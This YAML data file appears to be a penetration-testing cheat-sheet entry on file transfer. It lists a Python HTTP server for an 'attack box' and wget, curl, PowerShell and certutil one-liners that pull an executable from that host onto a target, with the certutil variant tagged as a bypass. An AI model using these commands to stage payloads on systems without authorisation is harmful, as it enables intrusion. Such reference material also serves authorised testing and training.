---
title: "File Transfer"
id: "transfer"
icon: "material-symbols:cloud-download-rounded"
commands:
  - cmd: "python3 -m http.server 8000"
    desc: "Attack Box Server"
    difficulty: "Easy"
    tags: ["python", "server", "http"]

  - cmd: "wget http://10.0.0.1:8000/file.exe -O file.exe"
    desc: "Linux Wget"
    difficulty: "Easy"
    tags: ["linux", "download"]

  - cmd: "curl http://10.0.0.1:8000/file.exe -o file.exe"
    desc: "Linux Curl"
    difficulty: "Easy"
    tags: ["linux", "curl"]

  - cmd: "iwr -uri http://10.0.0.1:8000/file.exe -OutFile file.exe"
    desc: "Windows PowerShell"
    difficulty: "Easy"
    tags: ["windows", "powershell"]

  - cmd: "certutil -urlcache -f http://10.0.0.1:8000/file.exe file.exe"
    desc: "Windows Certutil"
    difficulty: "Medium"
    tags: ["windows", "bypass"]
---

